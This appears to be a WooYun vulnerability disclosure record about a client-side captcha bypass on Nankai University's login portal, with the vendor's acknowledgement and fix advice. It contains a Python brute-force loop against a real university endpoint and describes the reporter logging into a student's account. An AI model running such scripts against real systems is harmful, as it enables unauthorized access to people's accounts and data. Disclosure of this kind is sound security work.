{"id": 43548, "wybug_id": "wooyun-2014-082411", "wybug_title": "南开大学信息门户网站设计不当可以爆破用户密码（利用密码猜用户）", "wybug_corp": "nankai.edu.cn", "wybug_author": "路人甲", "wybug_date": "2014-11-07 17:37", "wybug_open_date": "2014-12-22 17:40", "wybug_type": "未授权访问/权限绕过", "wybug_level": "中", "wybug_rank_0": "8", "wybug_status": "已交由第三方合作机构(CCERT教育网应急响应组)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["验证码绕过"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-11-07：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-11-10：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-11-20：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-11-30：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-12-10：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-12-22：\t细节向公众公开  简要描述： 危害么？可以查找全校密码为某个固定字符串的所有同学。，然后造成不必要的信息泄露。。有照片呀。。 详细说明：  由于该系统的验证码是由本地js生成并且仅仅在本地用js验证，因此，可以直接把验证码绕过。这样就可以用一个脚本不断发送post请求，根据服务器返回的结果判断密码正确与否。部分python代码如下：\nfor i in range(100000,999999+1):\tdata['Login.Token2']=str(i)\tprint (i)\tdat=urllib.urlencode(data) #encoding\treq =urllib2.Request('http://urp.nankai.edu.cn/userPasswordValidate1.portal',dat,headers1)#request\tresponse = urllib2.urlopen(req) #receive the response\thtml = response.read()#read the response\tdecode_html=html.decode('UTF-8')        if len(decode_html)== 97 :\t\tbreak\n   漏洞证明：  贴图几张：\n\n上图为单独有针对性的刷密码。\n\n这是密码是123456的同学的学号。有5人\n\n这是密码是111111的同学的学号。有10人\n\n这是密码跟学号相同的同学的学号。这些同学我数了一下，足足有49个同学随便选了一个ID进去，真的能进去。如图：\n\n太没有安全感了。   修复方案：  1.系统登录的时候，验证码要服务器验证过，不要只在客户端用js验证。验证码弄好点就可以了，没什么大事。2.如果我登陆过一次，返回的时候，验证码应该换一个，要不这样也可以绕过验证码。   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：10  确认时间：2014-11-10 08:45 厂商回复： 感谢路人甲反馈给我们的漏洞，我们会尽快修复，同时希望您继续关注南开大学网站安全。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 10, "Ranks": null}